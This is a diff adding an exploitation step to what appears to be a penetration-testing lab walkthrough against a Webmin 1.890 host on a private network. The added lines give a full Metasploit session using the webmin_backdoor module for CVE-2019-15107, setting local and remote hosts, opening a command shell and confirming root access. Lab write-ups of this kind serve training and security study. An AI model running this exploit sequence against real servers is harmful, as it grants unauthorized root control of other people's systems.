@@ -62,5 +62,18 @@ https://10.0.2.5:10000
 Step 2: Vulnerability check
 ->CVE-2019-15107 affects Webmin 1.890 — allows unauthenticated RCE via crafted POST request to /password_change.cgi.
 
+Step 3: Exploit Webmin (**Metasploit**)
+kali$ msfconsole -q
+msf > search webmin
+msf > use exploit/linux/webmin_backdoor
+msf exploit(linux/webmin_backdoor) > set LHOST 10.0.2.15
+msf exploit(linux/webmin_backdoor) > set RHOSTS 10.0.2.5
+msf exploit(linux/webmin_backdoor) > set SSL true
+msf exploit(linux/webmin_backdoor) > run
+Command shell session 1 opened
+whoami -> root (current user)
+id -> uid=0(root) gid=0(root) groups=0(root) (confirm root privileges)
+hostname -> HF2019-Linux (machine name)
+uname -a -> (linux kernel version & architecture)
 
 
